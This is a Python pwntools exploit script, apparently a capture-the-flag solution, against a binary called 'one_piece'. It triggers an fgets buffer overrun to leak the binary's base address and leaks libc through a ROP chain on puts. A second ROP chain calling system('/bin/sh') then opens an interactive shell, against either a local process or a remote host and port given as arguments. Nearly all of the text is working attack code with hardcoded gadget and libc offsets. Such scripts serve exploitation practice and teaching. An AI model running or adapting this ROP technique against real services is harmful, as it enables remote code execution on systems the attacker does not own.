#!/usr/bin/env python3

import sys
from pwn import *

DEBUG = False
if len(sys.argv) > 1 and sys.argv[1] == "debug":
    DEBUG = True

LOCAL = True
if len(sys.argv) > 2:
    LOCAL = False

binary = ELF("./one_piece")

puts_got = binary.got["puts"]
read_got = binary.got["read"]
printf_got = binary.got["printf"]
puts_plt = binary.plt["puts"]
binary_buffer = binary.symbols["buffer"]

main = binary.symbols["main"]
mugiwara = binary.symbols["mugiwara"]

if LOCAL:
    target = binary.process()
    if DEBUG:
        pause()
else:
    target = remote(sys.argv[1], sys.argv[2])

# Start with a read
target.sendline("read")
target.recvuntil(">>")

# Send payload that will trigger fgets buffer overrun
target.send("A" * 0x27 + "z")

target.sendline("gomugomunomi")
target.recvuntil("? : ")

bin_leak = int(target.recvuntil("\n", drop=True), 16)
bin_base = bin_leak - 0xA3A

target.recvuntil("? : ")

print(f"Binary base: {hex(bin_base)}")

# Gadgets
pop_rdi = 0xBA3  # pop rdi ; ret
leave_mugiwara = 0xA3E  # leave ; ret
pop_r14_r15 = 0xBA0  # pop r14 ; pop r15 ; ret

if LOCAL:
    libc = ELF("/usr/lib/libc.so.6")
    libc_puts = libc.symbols["puts"]
    libc_system = libc.symbols["system"]

    libc_binsh = 0x18DE78
else:
    libc_puts = 0x87490
    libc_system = 0x554E0

    libc_binsh = 0x1B6613

    one_gadget = 0xE6B93


# Build the rop chain to leak libc address
leak_chain = [
    pop_rdi,
    puts_got,
    puts_plt,
    main,
]
payload = b"B" * 0x38
for gadget in leak_chain:
    payload += p64(bin_base + gadget)

target.sendline(payload)
target.recvline()

libc_leak_raw = target.recvuntil("\n", drop=True)
libc_leak = libc_leak_raw + b"\x00" * (8 - len(libc_leak_raw))
libc_base = u64(libc_leak) - libc_puts

print(f"libc leak: {hex(u64(libc_leak))}")
print(f"libc base: {hex(libc_base)}")

# Start with a read
target.sendline("read")
print(target.recvuntil(">>"))

# Send payload that will trigger fgets buffer overrun
target.send("A" * 0x27 + "z")

target.sendline("gomugomunomi")
target.recvuntil("? : ")
target.recvuntil("? : ")

# Build the rop chain to pop a shell
shell_chain = [
    bin_base + pop_r14_r15,
    0,
    0,
    bin_base + pop_rdi,
    libc_base + libc_binsh,
    libc_base + libc_system,
]
payload = b"C" * 0x38
for gadget in shell_chain:
    payload += p64(gadget)

target.sendline(payload)
target.interactive()
